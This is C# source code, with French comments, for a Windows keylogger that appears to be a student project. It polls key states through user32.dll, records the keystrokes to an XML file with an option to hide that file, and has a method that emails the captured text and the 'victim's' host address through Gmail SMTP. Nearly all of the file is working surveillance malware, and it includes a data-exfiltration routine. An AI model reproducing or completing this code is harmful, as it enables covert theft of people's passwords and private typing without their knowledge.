using System;
using System.Collections.Generic;
using System.IO;
using System.Xml.Serialization;
using System.IO;
using System.Xml.Serialization;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Net.Mail;
using System.Threading;

namespace ProjetKeyLogger
{
    class KeyLogger
    {
        //Texte saisie depuis le dernier clic ou, touche "entré", ou temps > 30 seconde
        private CollectionEnregistrement collection_enregistrement;

        private string file_path;

        public string File_Path
        {
            get
            {
                return file_path;
            }
        }

        //Constructeur(peut etre pas nécessaire)
        public KeyLogger()
        {
            //On initialise la collection
            collection_enregistrement = new CollectionEnregistrement();

            //Chemin pour enregistrer le fichier XML
            file_path = "../../../Fichier XML/TestXML.xml";
        }

        //GetAsyncKeyState function : permet de savoir si une touche ets activé ou non
        //Cette fonction vient d'une librairie stockée dans user32.dll (le keylogger ne marche donc que sur windows, pas mac)
        // l'argument est une "virtual key code " car chaque action est asscoiée à une clé


        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int cle);

        public void capture()
        {
            //Création d'un objet Enregistrement qui contiendra le contenu de la capture clavier
            Enregistrement enregistrement = new Enregistrement();

            //Initialisation du nombre de caractere tapé
            int nb_caractere_tape = 0;

            //capture les frappes de touches et les afficher dans la console
            while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
            {
                //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
                Thread.Sleep(5); //nombre en miliseconde


                //verification de l'état de chaque touche (up ou down)
                //avec une table des code ASCII, les codes de clavier vont de 0 à 127
                //on va vérifier ces 128 touches
                for (int codeASCII = 0; codeASCII < 128; codeASCII++)
                {
                    int statut_cle = GetAsyncKeyState(codeASCII);
                    //le statut d'un clé est a 0 si elle n'est pas active
                    //le statut est a 32769 si la touche est appuyé donc on va pouvoir voir les touches
                    // on caste le nombre ascii en char
                    if (statut_cle == 32769)
                    {
                        Console.Write((char)codeASCII);

                        

                        //probleme : tout en majuscule + certaines touches non detectées


                        switch (codeASCII)
                        {
                            //Si touche Entrée
                            case 13:
                                //On ajoute l'enregistrement a la collection
                                collection_enregistrement.ajouterNew(enregistrement);

                                //On réinitialise l'enregistrement
                                enregistrement = new Enregistrement();
                                break;

                            case 8:
                               enregistrement.effacerContenu();
                                break;

                            default:
                                //Concatenation e la derniere touche tapée au contenu de l'enregistrement
                                enregistrement.ajouterContenu((char)codeASCII);
                                //Sinon on incrémente le nombre de caracteres tapé
                                nb_caractere_tape += 1;
                                break;

                        }

                       
                        //Si plus de 100 caracteres ont été tapé
                        if (nb_caractere_tape > 100)
                        {
                            //On enregistre le contenue en xml
                            collection_enregistrement.saveToXml(file_path);

                            //on cache le xml
                          //  File.SetAttributes(file_path, FileAttributes.Hidden);
                            //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case


                            //On reinitialise le nombre de caracteres
                            nb_caractere_tape = 0;

                            //On réinitialise la collection
                            collection_enregistrement = new CollectionEnregistrement();

                            //Puis on envoie un mail

                        }


                    }
                }
            }
        }


        //Envoyer le txt pr mail ?
        private void envoieMail()
        {
            string Chemin_Dossier = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string Chemin_Txt = Chemin_Dossier + @"\CaptureClavier.txt";

            //recuperation du contenu du fichier
            string Contenu = File.ReadAllText(Chemin_Txt);

            //date du mail
            DateTime Date_Mail = DateTime.Now;
            //l'object du mail
            string Objet_Mail = "Capture keylogger";
            //recuperation de l'adresse ip de l'ordinateur pour identifier notre victime
            var Nom_Ordinateur = Dns.GetHostEntry(Dns.GetHostName());

            //faire si jamais l'ordi a plusieurs adresse ip ?

            //Création du corps du mail
            //Utiliser les autres fonctions de charlie 
            string Corps_Mail = "date :" + Date_Mail + "\n Adresse ip de la victime :" + Nom_Ordinateur + "\n";
            Corps_Mail += Contenu;

            //Envoie du mail avec le protocole SMTP (utilisation d'une adresse gmail dans ce cas mais on peut changer)
            //587=numero de port de gmail
            SmtpClient Client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage Message_Mail = new MailMessage();

            //definition de l'adresse source à mettre entre les guillemets
            Message_Mail.From = new MailAddress("xxx@gmail.com");

            //definition de l'adresse de destination 
            Message_Mail.To.Add("xxx@gmail.com");

            //defition de l'objet du mail
            Message_Mail.Subject = Objet_Mail;

            //En rapport avec l'authentification à l'adresse mail mais vérifier pq on met à false
            Client.UseDefaultCredentials = false;

            //utilisation du protocole SSL (Secure sockets Layer) pour transporter de manière sécurisée
            Client.EnableSsl = true;

            //remplacer les guillemets avec les vraies valeurs
            Client.Credentials = new System.Net.NetworkCredential("adresse", "le mot de passe de la'dresse");

            //définition du corps du mail
            Message_Mail.Body = Corps_Mail;

            //Envoie du message
            Client.Send(Message_Mail);

        }


    }
}
